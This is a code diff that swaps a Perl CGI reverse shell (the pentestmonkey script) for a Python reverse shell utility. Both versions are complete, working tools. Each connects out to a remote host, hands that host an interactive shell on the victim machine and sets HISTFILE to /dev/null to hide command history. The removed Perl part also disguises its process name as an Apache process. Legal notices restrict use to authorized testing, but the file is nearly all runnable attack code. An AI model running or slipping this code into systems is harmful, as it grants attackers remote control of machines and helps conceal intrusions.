@@ -1,132 +1,144 @@
-#!/usr/bin/perl -w
-######################### RIP
+#!/usr/bin/env python3
+"""
+Reverse Shell Utility .. beta .. 
+Copyright (C) 2026
 
-##
-##
-# perl-reverse-shell - A Reverse Shell implementation in PERL
-# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
-#
-# This tool may be used for legal purposes only.  Users take full responsibility
-# for any actions performed using this tool.  The author accepts no liability
-# for damage caused by this tool.  If these terms are not acceptable to you, then
-# do not use this tool.
-#
-# In all other respects the GPL version 2 applies:
-#
-# This program is free software; you can redistribute it and/or modify
-# it under the terms of the GNU General Public License version 2 as
-# published by the Free Software Foundation.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License along
-# with this program; if not, write to the Free Software Foundation, Inc.,
-# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-#
-# This tool may be used for legal purposes only.  Users take full responsibility
-# for any actions performed using this tool.  If these terms are not acceptable to
-# you, then do not use this tool.
-#
-# You are encouraged to send comments, improvements or suggestions to
-# me at pentestmonkey@pentestmonkey.net
-#
-# Description
-# -----------
-# This script will make an outbound TCP connection to a hardcoded IP and port.
-# The recipient will be given a shell running as the current user (apache normally).
-#
+IMPORTANT LEGAL NOTICE:
+This tool is provided for AUTHORIZED SECURITY TESTING ONLY.
+Users must have explicit written permission before using this tool.
+Unauthorized use may violate computer fraud and abuse laws.
+Users take full responsibility for any actions performed using this tool.
 
-use strict;
-use Socket;
-use FileHandle;
-use POSIX;
-my $VERSION = "1.0";
+This program is distributed under the GPL v2 license.
+"""
 
-# Where to send the reverse shell.  Change these.
-my $ip = '127.0.0.1';
-my $port = 1234;
+import argparse
+import os
+import pty
+import socket
+import subprocess
+import sys
+from pathlib import Path
+from typing import Optional
 
-# Options
-my $daemon = 1;
-my $auth   = 0; # 0 means authentication is disabled and any 
-		# source IP can access the reverse shell
-my $authorised_client_pattern = qr(^127\.0\.0\.1$);
 
-# Declarations
-my $global_page = "";
-my $fake_process_name = "/usr/sbin/apache";
+class ReverseShell:
+    """Establishes a reverse shell connection to a remote host."""
 
-# Change the process name to be less conspicious
-$0 = "[httpd]";
+    def __init__(
+        self, host: str, port: int, shell: str = "/bin/bash", timeout: int = 30
+    ):
+        self.host = host
+        self.port = port
+        self.shell = shell
+        self.timeout = timeout
+        self.sock: Optional[socket.socket] = None
 
-# Authenticate based on source IP address if required
-if (defined($ENV{'REMOTE_ADDR'})) {
-	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");
+    def connect(self) -> bool:
+        """Establish TCP connection to the remote host."""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(self.timeout)
+            self.sock.connect((self.host, self.port))
+            print(
+                f"[+] Connected to {self.host}:{self.port}", file=sys.stderr
+            )
+            return True
+        except socket.error as e:
+            print(f"[-] Connection failed: {e}", file=sys.stderr)
+            return False
 
-	if ($auth) {
-		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
-			cgiprint("ERROR: Your client isn't authorised to view this page");
-			cgiexit();
-		}
-	}
-} elsif ($auth) {
-	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
-	cgiexit(0);
-}
+    def spawn_shell(self) -> None:
+        """Spawn an interactive shell over the connection."""
+        if not self.sock:
+            raise RuntimeError("Not connected")
 
-# Background and dissociate from parent process if required
-if ($daemon) {
-	my $pid = fork();
-	if ($pid) {
-		cgiexit(0); # parent exits
-	}
+        # Send initial system information
+        try:
+            info = subprocess.check_output(
+                "uname -a; id; pwd", shell=True, stderr=subprocess.STDOUT
+            )
+            self.sock.sendall(info)
+        except subprocess.CalledProcessError:
+            pass
 
-	setsid();
-	chdir('/');
-	umask(0);
-}
+        # Spawn PTY for interactive shell
+        os.dup2(self.sock.fileno(), 0)  # stdin
+        os.dup2(self.sock.fileno(), 1)  # stdout
+        os.dup2(self.sock.fileno(), 2)  # stderr
 
-# Make TCP connection for reverse shell
-socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
-if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
-	cgiprint("Sent reverse shell to $ip:$port");
-	cgiprintpage();
-} else {
-	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
-	cgiexit();	
-}
+        # Clear history
+        os.environ["HISTFILE"] = "/dev/null"
 
-# Redirect STDIN, STDOUT and STDERR to the TCP connection
-open(STDIN, ">&SOCK");
-open(STDOUT,">&SOCK");
-open(STDERR,">&SOCK");
-$ENV{'HISTFILE'} = '/dev/null';
-system("w;uname -a;id;pwd");
-exec({"/bin/sh"} ($fake_process_name, "-i"));
+        # Execute shell
+        pty.spawn(self.shell)
 
-# Wrapper around print
-sub cgiprint {
-	my $line = shift;
-	$line .= "<p>\n";
-	$global_page .= $line;
-}
+    def cleanup(self) -> None:
+        """Close the socket connection."""
+        if self.sock:
+            self.sock.close()
 
-# Wrapper around exit
-sub cgiexit {
-	cgiprintpage();
-	exit 0; # 0 to ensure we don't give a 500 response.
-}
 
-# Form HTTP response using all the messages gathered by cgiprint so far
-sub cgiprintpage {
-	print "Content-Length: " . length($global_page) . "\r
-Connection: close\r
-Content-Type: text\/html\r\n\r\n" . $global_page;
-}
+def validate_port(port: int) -> bool:
+    """Validate port number is in valid range."""
+    return 1 <= port <= 65535
 
-############################
-##
-#3
+
+def main() -> int:
+    """Main entry point."""
+    parser = argparse.ArgumentParser(
+        description="Reverse shell utility for authorized testing",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="WARNING: Only use with explicit authorization!",
+    )
+    parser.add_argument(
+        "-H", "--host", required=True, help="Target host IP address"
+    )
+    parser.add_argument(
+        "-p", "--port", type=int, required=True, help="Target port number"
+    )
+    parser.add_argument(
+        "-s",
+        "--shell",
+        default="/bin/bash",
+        help="Shell to spawn (default: /bin/bash)",
+    )
+    parser.add_argument(
+        "-t",
+        "--timeout",
+        type=int,
+        default=30,
+        help="Connection timeout in seconds (default: 30)",
+    )
+
+    args = parser.parse_args()
+
+    # Validate inputs
+    if not validate_port(args.port):
+        print("[-] Invalid port number", file=sys.stderr)
+        return 1
+
+    if not Path(args.shell).exists():
+        print(f"[-] Shell not found: {args.shell}", file=sys.stderr)
+        return 1
+
+    # Create and execute reverse shell
+    shell = ReverseShell(args.host, args.port, args.shell, args.timeout)
+
+    try:
+        if not shell.connect():
+            return 1
+        shell.spawn_shell()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user", file=sys.stderr)
+    except Exception as e:
+        print(f"[-] Error: {e}", file=sys.stderr)
+        return 1
+    finally:
+        shell.cleanup()
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
